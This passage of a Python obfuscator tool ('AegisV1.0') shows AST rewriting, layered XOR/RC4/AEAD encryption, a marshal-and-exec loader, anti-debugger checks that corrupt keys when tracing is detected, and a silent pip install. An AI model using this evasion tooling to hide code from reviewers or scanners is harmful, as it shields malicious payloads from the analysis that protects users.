                    it=ast.unparse(n.iter);n.iter=ast.parse(f"[{{0:({{0:[{it}][0]}}[0],)[0]}}[0]][0]",mode='eval').body
                except:pass
                return n
            def visit_While(魁_,n):
                魁_.generic_visit(n)
                try:
                    test=ast.unparse(n.test);n.test=ast.parse(f"({{0:[{{0:({{0:[{test}][0]}}[0],)[0]}}[0]][0]}}[0],)[0]",mode='eval').body
                except:pass
                return n
            def visit_IfExp(魁_,n):
                魁_.generic_visit(n)
                try:
                    test=ast.unparse(n.test);n.test=ast.parse(f"[{{0:({{0:[{{0:({{0:[{test}][0]}}[0],)[0]}}[0]][0]}}[0],)[0]}}[0]][0]",mode='eval').body
                except:pass
                return n
            def visit_Assert(魁_,n):
                魁_.generic_visit(n)
                try:
                    test=ast.unparse(n.test);n.test=ast.parse(f"({{0:[{{0:({{0:[{test}][0]}}[0],)[0]}}[0]][0]}}[0],)[0]",mode='eval').body
                except:pass
                return n
            def visit_Lambda(魁_,n):
                魁_.generic_visit(n)
                try:
                    body=ast.unparse(n.body);n.body=ast.parse(f"[{{0:({{0:[{{0:({{0:[{body}][0]}}[0],)[0]}}[0]][0]}}[0],)[0]}}[0]][0]",mode='eval').body
                except:pass
                return n
            def visit_Raise(魁_,n):
                魁_.generic_visit(n)
                if n.exc is not None:
                    v=_v()
                    try:
                        exc=ast.unparse(n.exc);n.exc=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{exc}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                    except:pass
                return n
            def visit_AugAssign(魁_,n):
                魁_.generic_visit(n)
                try:
                    val=ast.unparse(n.value);n.value=ast.parse(f"({{0:[{{0:({{0:[({val})][0]}}[0],)[0]}}[0]][0]}}[0],)[0]",mode='eval').body
                except:pass
                return n
            def visit_Yield(魁_,n):
                魁_.generic_visit(n)
                if n.value is not None:
                    v=_v()
                    try:
                        val=ast.unparse(n.value);n.value=ast.parse(f"(lambda {v}:{v})(({{0:[{{0:({val},)[0]}}[0]][0]}}[0],)[0])",mode='eval').body
                    except:pass
                return n
            def visit_YieldFrom(魁_,n):
                魁_.generic_visit(n)
                v=_v()
                try:
                    val=ast.unparse(n.value);n.value=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                except:pass
                return n
            def visit_Await(魁_,n):
                魁_.generic_visit(n)
                try:
                    val=ast.unparse(n.value);n.value=ast.parse(f"({{0:[{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0]}}[0],)[0]",mode='eval').body
                except:pass
                return n
            def visit_FormattedValue(魁_,n):
                魁_.generic_visit(n)
                try:
                    val=ast.unparse(n.value);n.value=ast.parse(f"({{0:[{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0]}}[0],)[0]",mode='eval').body
                except:pass
                return n
            def visit_Starred(魁_,n):
                魁_.generic_visit(n)
                try:
                    val=ast.unparse(n.value);n.value=ast.parse(f"[{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0]",mode='eval').body
                except:pass
                return n
            def visit_ListComp(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=_v()
                    val=ast.unparse(n);return ast.parse(f"(lambda {v}:{v})(({{0:[{{0:({val},)[0]}}[0]][0]}}[0],)[0])",mode='eval').body
                except:pass
                return n
            def visit_SetComp(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=_v()
                    val=ast.unparse(n);return ast.parse(f"(lambda {v}:{v})(({{0:[{{0:({val},)[0]}}[0]][0]}}[0],)[0])",mode='eval').body
                except:pass
                return n
            def visit_DictComp(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=_v()
                    val=ast.unparse(n);return ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                except:pass
                return n
            def visit_GeneratorExp(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=_v()
                    val=ast.unparse(n);return ast.parse(f"(lambda {v}:{v})({val})",mode='eval').body
                except:pass
                return n
            def visit_With(魁_,n):
                魁_.generic_visit(n)
                for item in n.items:
                    v=_v()
                    try:
                        ctx=ast.unparse(item.context_expr);item.context_expr=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{ctx}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                    except:pass
                return n
            def visit_Match(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=_v()
                    subj=ast.unparse(n.subject);n.subject=ast.parse(f"(lambda {v}:{v})(({{0:[{{0:({subj},)[0]}}[0]][0]}}[0],)[0])",mode='eval').body
                except:pass
                return n
            def visit_Slice(魁_,n):
                魁_.generic_visit(n)
                if n.lower:
                    v=_v()
                    try:
                        lo=ast.unparse(n.lower);n.lower=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{lo}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                    except:pass
                if n.upper:
                    v=_v()
                    try:
                        up=ast.unparse(n.upper);n.upper=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{up}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                    except:pass
                if n.step:
                    v=_v()
                    try:
                        st=ast.unparse(n.step);n.step=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{st}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                    except:pass
                return n
            def visit_NamedExpr(魁_,n):
                魁_.generic_visit(n)
                try:
                    v=_v()
                    val=ast.unparse(n.value);n.value=ast.parse(f"(lambda {v}:{v})([{{0:({{0:[{val}][0]}}[0],)[0]}}[0]][0])",mode='eval').body
                except:pass
                return n
            def visit_AsyncFunctionDef(魁_,n):
                try:
                    魁_.generic_visit(n)
                except:pass
                return n
            def visit_AsyncFor(魁_,n):
                try:
                    魁_.generic_visit(n);v=_v()
                    it=ast.unparse(n.iter);n.iter=ast.parse(f"(lambda {v}:{v})({it})",mode='eval').body
                except:pass
                return n
            def visit_AsyncWith(魁_,n):
                try:
                    魁_.generic_visit(n)
                    for item in n.items:
                        try:
                            ctx=ast.unparse(item.context_expr);item.context_expr=ast.parse(f"[({ctx},)[0]][0]",mode='eval').body
                        except:pass
                except:pass
                return n
        try:
            from concurrent.futures import ThreadPoolExecutor
            def _f(l):
                r=[]
                for i in l:
                    if isinstance(i,list):r.extend(_f(i))
                    else:r.append(i)
                return r
            _I=[i for i,n in enumerate(tree.body)if isinstance(n,(ast.FunctionDef,ast.AsyncFunctionDef))]
            if _I:
                with ThreadPoolExecutor(max_workers=min(32,len(_I)+4))as _E:_D=list(_E.map(lambda n:魁().visit(n),[tree.body[i]for i in _I]))
                for i,n in zip(_I,_D):tree.body[i]=n
            for i,n in enumerate(tree.body):
                if i not in _I:tree.body[i]=魁().visit(n)
            tree.body=_f(tree.body);ast.fix_missing_locations(tree)
            op_list="[getattr,setattr,delattr,__import__,(lambda x,y:x+y),(lambda x,y:x-y),(lambda x,y:x*y),(lambda x,y:x/y),(lambda x,y:x//y),(lambda x,y:x%y),(lambda x,y:x**y),(lambda x,y:x<<y),(lambda x,y:x>>y),(lambda x,y:x&y),(lambda x,y:x|y),(lambda x,y:x^y),(lambda x,y:x==y),(lambda x,y:x!=y),(lambda x,y:x<y),(lambda x,y:x>y),(lambda x,y:x<=y),(lambda x,y:x>=y),(lambda x,y:x is y),(lambda x,y:x is not y),(lambda x,y:x in y),(lambda x,y:x not in y),(lambda f,*a,**k:f(*a,**k))]"
            op_k=凱_._r.randint(1,255)
            op_enc=bytes(b^op_k for b in zlib.compress(op_list.encode()))
            op_expr=f"eval(__import__('zlib').decompress(bytes(b^{op_k} for b in {op_enc})))"
            op_ast=ast.Assign(targets=[ast.Name(id=_opkey,ctx=ast.Store())],value=ast.parse(op_expr,mode='eval').body)
            tree.body.insert(0,op_ast)
            if _data:
                _dec_src=f"def {_fname}(i):return __import__('zlib').decompress(bytes(c^{_key} for c in {_dname}[i])).decode()"
                _dec_ast=ast.parse(_dec_src).body[0]
                _dat_ast=ast.Assign(targets=[ast.Name(id=_dname,ctx=ast.Store())],value=ast.Constant(value=_data))
                tree.body.insert(0,_dat_ast)
                tree.body.insert(1,_dec_ast)
                ast.fix_missing_locations(tree)
        except:pass
        toplevel_funcs={n.name for n in tree.body if isinstance(n,ast.FunctionDef)and n.name not in reserved and not n.name.startswith('_')}
        renames={fn:凱_.α()for fn in toplevel_funcs}
        for n in ast.walk(tree):
            if isinstance(n,ast.FunctionDef)and n.name in renames:n.name=renames[n.name]
            elif isinstance(n,ast.Call)and isinstance(n.func,ast.Name)and n.func.id in renames:n.func.id=renames[n.func.id]
            elif isinstance(n,ast.Name)and n.id in renames:n.id=renames[n.id]
        return tree
    # encode
    def Σ(凱_,code):
        code=凱_.ζ(code)
        r=凱_._r;α=lambda:凱_.α(clean=True);marshaled,h,depth=凱_.雷(code);compressed=凱_.μ(marshaled)
        key1=r.randbytes(32);key2=r.randbytes(32);key3=r.randbytes(32)
        layer1=bytes(b^key1[i%32]for i,b in enumerate(compressed))
        layer2=bytes(b^key2[i%32]for i,b in enumerate(layer1))
        encrypted=凱_.χ(layer2,key3)
        enc_h=bytes(ord(c)^key1[i%32]^key2[i%32]for i,c in enumerate(h))
        v_pay,v_k1,v_k2,v_k3,v_h,v_d,v_m,v_chk=α(),α(),α(),α(),α(),α(),α(),α()
        v_anti,v_tmp,v_ctx,v_code=α(),α(),α(),α()
        v_op1,v_op2=α(),α()
        op_val1=r.randint(100,999);op_val2=r.randint(2,9)
        sm_key=r.randint(50,200);sm_enc=[ord(c)^sm_key for c in 'AEGIS_SAFE_MODE']
        _k1s=base64.a85encode(key1).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        _k2s=base64.a85encode(key2).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        _k3s=base64.a85encode(key3).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        _hs=base64.a85encode(enc_h).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        
        def _H(s):return list(map(ord,s))
        _sys,_ct,_os,_th,_lz,_ti,_zl,_b6,_ma,_ha=_H('sys'),_H('ctypes'),_H('os'),_H('threading'),_H('lzma'),_H('time'),_H('zlib'),_H('base64'),_H('marshal'),_H('hashlib')
        XK=r.randint(1,255)
        def _XE(s):return [x^XK for x in s]
        
        _ps=base64.a85encode(encrypted).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        loader_parts=[]
        loader_parts.append(f"import sys,os;{v_op1}={op_val1};{v_op2}={op_val2}")
        loader_parts.append(f"def _I(n):return __import__(''.join(chr(c^{XK})for c in n))")
        loader_parts.append(f"try:from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AG,ChaCha20Poly1305 as _CC")
        loader_parts.append(f"except:__import__('subprocess').check_call([sys.executable,'-m','pip','install','cryptography']);from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AG,ChaCha20Poly1305 as _CC")
        loader_parts.append(f"def _X(d,k):")
        loader_parts.append(f" S=bytearray(range(256));j=0;k=bytearray(k);l=len(k)")
        loader_parts.append(f" for i in range(256):j=(j+S[i]+k[i%l])&255;S[i],S[j]=S[j],S[i]")
        loader_parts.append(f" d=bytearray(d);n=len(d);i=0;j=0;r=bytearray(n)")
        loader_parts.append(f" for x in range(n):i=(i+1)&255;j=(j+S[i])&255;S[i],S[j]=S[j],S[i];r[x]=d[x]^S[(S[i]+S[j])&255]")
        loader_parts.append(f" r=bytes(r);n=r[:12];c=r[12:];k32=k[:32]")
        loader_parts.append(f" try:p=_AG(k32).decrypt(n,c,None)")
        loader_parts.append(f" except:p=_CC(k32).decrypt(n,c,None)")
        loader_parts.append(f" return bytes(b^k[i%len(k)]for i,b in enumerate(p))")
        loader_parts.append(f"""def {v_anti}():
  _SM=''.join(chr(c^{sm_key})for c in {sm_enc})
  if os.environ.get(_SM)=='1':return
  try:
   _sy=_I({_XE(_sys)});_ct=_I({_XE(_ct)})
   if _sy.gettrace()or _sy.getprofile():globals()['__aegis_corrupt__']=True
   if hasattr(_ct,'windll'):
     {v_tmp}=_ct.c_int(0);_ct.windll.kernel32.CheckRemoteDebuggerPresent(_ct.windll.kernel32.GetCurrentProcess(),_ct.byref({v_tmp}))
     if {v_tmp}.value:globals()['__aegis_corrupt__']=True
     if _ct.windll.kernel32.IsDebuggerPresent():globals()['__aegis_corrupt__']=True
  except:pass""")
        loader_parts.append(f"try:")
        loader_parts.append(f" {v_anti}()")
        loader_parts.append(f" _bk1='{_k1s}';_bk2='{_k2s}';_bk3='{_k3s}';_hs='{_hs}'")
        loader_parts.append(f" _B=_I({_XE(_b6)});_L=_I({_XE(_lz)});_M=_I({_XE(_ma)});_H=_I({_XE(_ha)})")
        loader_parts.append(f" {v_k1}=_B.a85decode(_bk1);{v_k2}=_B.a85decode(_bk2);{v_k3}=_B.a85decode(_bk3)")
        loader_parts.append(f" {v_h}=_B.a85decode(_hs);{v_d}=_B.a85decode({v_pay})")
        
        logic_block = []
        logic_block.append(f" if globals().get('__aegis_corrupt__'):{v_k1}=bytes(b^0xFF for b in {v_k1})")
        logic_block.append(f" if ({v_op1}*{v_op1})>=0:")
        logic_block.append(f"  {v_anti}()")
        logic_block.append(f"  {v_d}=_X({v_d},{v_k3})")
        logic_block.append(f"  if ({v_op1}+{v_op2}*7)%7=={v_op1}%7:")
        logic_block.append(f"   {v_d}=bytes(b^{v_k2}[i%32]for i,b in enumerate({v_d}))")
        logic_block.append(f"   _D=bytes(b^{v_k1}[i%32]for i,b in enumerate({v_d}));_A=_D[0];_D=_D[1:]")
        logic_block.append(f"   {v_d}=[_L.decompress,__import__('bz2').decompress,__import__('gzip').decompress][_A](_D)")
        
        loader_parts.extend(logic_block)
        loader_parts.append(f" for _ in range({depth}):{v_m},{v_d}=_M.loads({v_d});{v_d}=bytes(b^{v_m}[i%32]for i,b in enumerate({v_d}))")
        loader_parts.append(f""" if (({v_op2}**2-{v_op2}**2)==0):
  {v_chk}=bytes(b^{v_k1}[i%32]^{v_k2}[i%32]for i,b in enumerate({v_h})).decode()
  if _H.sha256({v_d}).hexdigest()!={v_chk}:globals()['__aegis_corrupt__']=True""")
        loader_parts.append(f" {v_anti}()")
        loader_parts.append(f" if getattr(exec,'__module__',None)not in[None,'builtins']:globals()['__aegis_corrupt__']=True")
        loader_parts.append(f" {v_code}=_M.loads({v_d});del {v_d},{v_k1},{v_k2},{v_k3},{v_h};__import__('gc').collect();exec({v_code},globals())")
        loader_parts.append(f"except:pass")
        
        loader = "\n".join(loader_parts)
        _ps=base64.a85encode(encrypted).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        extra_vars=f"{v_pay}='{_ps}'"
        vm_src,_,_,_,_=凱_.虛(loader,key1,extra_vars,with_clear=True)
        shell_bytes=lzma.compress(vm_src.encode(),preset=9)
        K1,K2,K3=凱_._r.randint(1,255),凱_._r.randint(1,255),凱_._r.randint(1,255)
        shell_enc=bytes(((b+(i*K1)+K2)&0xFF)^K3 for i,b in enumerate(shell_bytes))
        shell_code=base64.a85encode(shell_enc).decode('ascii').replace('\\','\\\\').replace("'","\\'")
        v_c,v_k1,v_k2,v_k3=凱_.α(compact=True),凱_.α(compact=True),凱_.α(compact=True),凱_.α(compact=True)
        v_std,v_w,v_f,v_msg=凱_.α(compact=True),凱_.α(compact=True),凱_.α(compact=True),凱_.α(compact=True)
        _XK=凱_._r.randint(1,255)
        def _to_xor(s):return [ord(c)^_XK for c in s]
        def _to_ords(s):return list(map(ord, s))
        b64_x=_to_xor('base64');lzma_x=_to_xor('lzma');sys_x=_to_xor('sys')
        std_ords=_to_ords('stdout');w_ords=_to_ords('write');f_ords=_to_ords('flush');load_ords=_to_ords('>> Loading...\r')
        l1=f"{v_c}='{shell_code}';{v_k1}={K1};{v_k2}={K2};{v_k3}={K3};{v_std}={std_ords};{v_w}={w_ords};{v_f}={f_ords};{v_msg}={load_ords};_XK={_XK}"
        l2=f"""(lambda _b,_l,_s,_S,_g,_X:[getattr(getattr(_s,_S({v_std})),_S({v_w}))(_S({v_msg})),getattr(getattr(_s,_S({v_std})),_S({v_f}))(),exec(_l.decompress(bytes((((b^{v_k3})-{v_k2}-(i*{v_k1}))&0xFF)for i,b in enumerate(_b.a85decode({v_c})))),_g())] )(__import__(''.join(chr(c^_XK)for c in {b64_x})),__import__(''.join(chr(c^_XK)for c in {lzma_x})),__import__(''.join(chr(c^_XK)for c in {sys_x})),lambda x:''.join(map(chr,x)),globals,_XK)"""
        return f"_aegis='AegisV1.0'\n_author='yeppp'\n_version=('1.0','{time.strftime('%Y-%m-%d')}')\n{l1}\n{l2}"
    # analyze
    def θ(凱_,tree):
        import math
        def entropy(s):
            if not s:return 0
            freq={};l=len(s)
            for c in s:freq[c]=freq.get(c,0)+1
            return -sum((f/l)*math.log2(f/l)for f in freq.values())
        info={'purpose':set(),'caps':set(),'deps':set(),'fns':{},'classes':{},'sens_vars':set(),'sens_strs':set(),'core':set(),'entries':set()}
        call_count={};complexity={};data_flow={};cross_refs={};fn_scores={}
        sens_keywords=['token','password','secret','key','api','auth','credential','license','webhook','private','cookie','session','bearer','jwt','hash','encrypt','decrypt','sign','verify','bot_token','discord_token','telegram_token','user_agent','authorization','access_token','refresh_token','client_id','client_secret','api_key','apikey','app_id','app_secret','oauth','guild','channel_id','chat_id','admin','root','sudo','login','passwd','pwd','pin','otp','2fa','mfa','totp','backup_code','recovery','cert','ssl','tls','pem','pfx','keystore','truststore','signing_key','encryption_key','master_key','database_url','db_url','connection_string','mongo_uri','redis_url','smtp','mail_pass','email_pass','aws_access','aws_secret','azure','gcp','firebase','stripe','paypal','payment','card_number','cvv','expiry','billing','invoice','subscription','premium','license_key','serial','activation','crack','keygen','bypass','exploit','payload','shellcode','inject','hook','patch','tamper','reverse','decompile','debug','trace','breakpoint','dump','extract','leak','steal','grab','sniff','mitm','proxy','intercept']
        crypto_patterns=['base64','b64','encrypt','decrypt','hmac','sha','md5','aes','rsa','cipher','iv','salt','pbkdf','bcrypt','argon','scrypt','hash','fernet','chacha','blowfish','des','3des','ecdsa','ed25519','curve25519','nacl','secretbox','sealedbox','cryptodome','pycrypto','pyopenssl','ssl_context','tls_version']
        dep_caps={'discord':'bot','telegram':'bot','slack':'bot','flask':'web','django':'web','fastapi':'web','aiohttp':'web','requests':'network','httpx':'network','urllib':'network','socket':'network','asyncio':'async','threading':'concurrent','multiprocessing':'concurrent','cryptography':'crypto','hashlib':'crypto','hmac':'crypto','jwt':'auth','oauth':'auth','sqlite3':'database','pymongo':'database','redis':'database','sqlalchemy':'database','selenium':'automation','pyautogui':'automation','opencv':'vision','PIL':'image','pygame':'game','tkinter':'gui','PyQt':'gui','wx':'gui','click':'cli','argparse':'cli','typer':'cli','os':'system','sys':'system','subprocess':'system','shutil':'file','pathlib':'file','json':'data','yaml':'data','csv':'data','xml':'data','pickle':'serialize','marshal':'serialize'}
        for n in ast.walk(tree):
            if isinstance(n,ast.Import):
                for a in n.names:info['deps'].add(a.name.split('.')[0])
            elif isinstance(n,ast.ImportFrom)and n.module:info['deps'].add(n.module.split('.')[0])
            elif isinstance(n,ast.FunctionDef)or isinstance(n,ast.AsyncFunctionDef):
                info['fns'][n.name]=n;call_count[n.name]=0;cross_refs[n.name]=set();score=len(n.body)*2
                body=ast.unparse(n);body_lower=body.lower()
                if'async'in body or'await'in body:info['caps'].add('async');score+=10
                if'open('in body or'read('in body or'write('in body:info['caps'].add('file');score+=15
                if'socket'in body or'connect'in body or'request'in body:info['caps'].add('network');score+=20
                if any(p in body_lower for p in crypto_patterns):info['caps'].add('crypto');info['core'].add(n.name);score+=30
                if any(k in body_lower for k in sens_keywords):info['caps'].add('auth');info['core'].add(n.name);score+=25
                for c in ast.walk(n):
                    if isinstance(c,ast.If):score+=3
                    elif isinstance(c,ast.For)or isinstance(c,ast.While):score+=5
                    elif isinstance(c,ast.Try):score+=8
                    elif isinstance(c,ast.BinOp)and isinstance(c.op,ast.BitXor):score+=10
                    elif isinstance(c,ast.Call):
                        score+=2
                        if isinstance(c.func,ast.Name):cross_refs[n.name].add(c.func.id)
                    elif isinstance(c,ast.Return)and c.value:score+=3
                complexity[n.name]=score;fn_scores[n.name]=score
            elif isinstance(n,ast.ClassDef):
                info['classes'][n.name]=n;body=ast.unparse(n);body_lower=body.lower()
                if any(k in body_lower for k in['client','bot','handler','manager','controller']):info['purpose'].add('bot');info['core'].add(n.name)
                if any(k in body_lower for k in['server','app','api','service','endpoint']):info['purpose'].add('server');info['core'].add(n.name)
                if any(k in body_lower for k in sens_keywords):info['core'].add(n.name)
            elif isinstance(n,ast.Assign):
                for t in n.targets:
                    if isinstance(t,ast.Name):
                        data_flow[t.id]=n.value
                        if isinstance(n.value,ast.Constant)and isinstance(n.value.value,str):
                            v=n.value.value
                            if len(v)>8:
                                ent=entropy(v)
                                if ent>4.0 and len(v)>=16:info['sens_vars'].add(t.id);info['sens_strs'].add(v)
                                if v.startswith('http')or'://'in v:info['sens_vars'].add(t.id);info['sens_strs'].add(v)
                                if'@'in v and'.'in v:info['sens_vars'].add(t.id);info['sens_strs'].add(v)
                                if any(k in v.lower()for k in sens_keywords):info['sens_vars'].add(t.id);info['sens_strs'].add(v)
            elif isinstance(n,ast.Constant)and isinstance(n.value,str):
                v=n.value
                if len(v)>8:
                    ent=entropy(v)
                    if ent>4.0 and len(v)>=16:info['sens_strs'].add(v)
                    if v.startswith('http')or'://'in v:info['sens_strs'].add(v)
            elif isinstance(n,ast.Call)and isinstance(n.func,ast.Name)and n.func.id in call_count:call_count[n.func.id]+=1
        for dep in info['deps']:
            if dep in dep_caps:info['caps'].add(dep_caps[dep]);info['purpose'].add(dep_caps[dep])
        for fn in cross_refs:cross_refs[fn]=cross_refs[fn]&set(info['fns'].keys())
        for fn,refs in cross_refs.items():
            if refs:fn_scores[fn]=fn_scores.get(fn,0)+len(refs)*5
        if info['fns']:
            if len(info['fns'])<=10:
                info['core']=set(info['fns'].keys())
            else:
                max_score=max(fn_scores.values())if fn_scores else 0
                max_calls=max(call_count.values())if call_count else 0
                for fn in info['fns']:
                    score=fn_scores.get(fn,0);calls=call_count.get(fn,0)
                    is_core=(score>=max_score*0.3)or(calls>=max_calls*0.3)or(calls>=3)or(len(cross_refs.get(fn,set()))>=2)
                    if is_core:info['core'].add(fn)
                if not info['core']:info['core']=set(info['fns'].keys())
        for fn,node in info['fns'].items():
            body=ast.unparse(node)
            if any(sv in body for sv in info['sens_vars'])or any(ss in body for ss in info['sens_strs']):info['core'].add(fn)
        for cls,node in info['classes'].items():
            body=ast.unparse(node)
            if any(sv in body for sv in info['sens_vars'])or any(ss in body for ss in info['sens_strs']):info['core'].add(cls)
        called_fns={fn for fn,cnt in call_count.items()if cnt>0}
        for fn in info['fns']:
            if fn not in called_fns and not fn.startswith('_'):info['entries'].add(fn)
        if not info['entries']:info['entries']=set(info['fns'].keys())
        return info

    # main
    def Ω(凱_,source,layers=2):
        _is_aegis=any(kw in source.lower()for kw in['aegis','凱','obfuscate','anti_debug','protection','decompile'])
        if _is_aegis:layers=max(layers,3)
        try:tree=ast.parse(source)
        except:pass
        tree=凱_.霧(tree)
        info=凱_.θ(tree)
        for n in ast.walk(tree):
            if isinstance(n,ast.FunctionDef):
                fn_lower=n.name.lower()
                is_sens=n.name in info['core'] or _is_aegis
                if is_sens:
                    new_body=[]
                    wrap_layers=2 if n.name in info['core']else 1
                    for stmt in n.body:
                        try:
                            wrapped=stmt
                            for _ in range(wrap_layers):
                                jv=凱_.α(compact=True)
                                walrus=ast.NamedExpr(target=ast.Name(id=jv,ctx=ast.Store()),value=ast.Constant(value=凱_._r.randint(1,9999)))
                                outer_if=ast.If(test=walrus,body=[wrapped],orelse=[])
                                ast.fix_missing_locations(outer_if)
                                wrapped=outer_if
                            new_body.append(wrapped)
                        except:new_body.append(stmt)
                    n.body=new_body
        ast.fix_missing_locations(tree)
        for _ in range(layers):tree=凱_.Ψ(tree);ast.fix_missing_locations(tree)
        transformed=ast.unparse(tree)
        junk=凱_.闘()+"\n"+凱_.魔()+"\n"+凱_.幻()+"\n"+凱_.影()
        shield=凱_.盾()+"\n"+凱_.態()+"\n"+凱_.封()
        anti=凱_.甲()+"\n"+凱_.乙()+"\n"+凱_.丙()+"\n"+凱_.丁()+"\n"+凱_.戊()+"\n"+凱_.己()+"\n"+凱_.庚()+"\n"+凱_.辛()+"\n"+凱_.壬()+"\n"+凱_.癸()+"\n"+凱_.子()+"\n"+凱_.丑()+"\n"+凱_.寅()
        bomb=凱_.爆()+"\n"+凱_.偽()+"\n"+凱_.請()+"\n"+凱_.査()+"\n"+凱_.痕()+"\n"+凱_.御()
        code=凱_.初()+"\n"+junk+"\n"+shield+"\n"+anti+"\n"+bomb+"\n"+transformed
        try:code=ast.unparse(凱_.霧(ast.parse(code)))
        except:pass
        try:
            import lzma, base64
            key = 凱_._r.randint(1, 255)
            comp_data = lzma.compress(code.encode(), preset=9)
            enc_data = bytes(b ^ key for b in comp_data)
            pay = base64.a85encode(enc_data).decode()
            v_l, v_b, v_p, v_d, v_k = 凱_.α(compact=True), 凱_.α(compact=True), 凱_.α(compact=True), 凱_.α(compact=True), 凱_.α(compact=True)
            inner_code = f"import lzma as {v_l}, base64 as {v_b};{v_k}={key};{v_p}={v_b}.a85decode({repr(pay)});{v_d}=bytes(b^{v_k} for b in {v_p});exec({v_l}.decompress({v_d}))"
            vm_wrapped,_,_,_,_ = 凱_.虛(inner_code, 凱_._r.randbytes(32))
            code = vm_wrapped
        except:pass
        return 凱_.ζ(code)

# run
def main():
    if len(sys.argv)<2:print("Usage: python aegisv1.py <file.py>");sys.exit(1)
    f=sys.argv[1]
    if not os.path.exists(f):print(f"\033[91mFile not found: {f}\033[0m");sys.exit(1)
    if not f.endswith('.py'):print(f"\033[91mPlease select a python file\033[0m");sys.exit(1)
    try:src=open(f,'r',encoding='utf-8').read()
    except:print(f"\033[91mCannot read file\033[0m");sys.exit(1)
    if not src.strip():print(f"\033[91mFile is empty\033[0m");sys.exit(1)
    try:tree=ast.parse(src)
    except:print(f"\033[91mSyntax error\033[0m");sys.exit(1)
    print(f"\033[93m[*] Obfuscating...\033[0m")
    s=time.time();obf=凱();final=obf.Σ(obf.Ω(src));out=os.path.splitext(f)[0]+"_obf.py"
    with open(out,'w',encoding='utf-8') as _of:_of.write(final)
    print(f"\033[92m[+] Done! {out} ({os.path.getsize(out)/1024:.2f} KB) - {time.time()-s:.2f}s\033[0m")
if __name__=="__main__":main()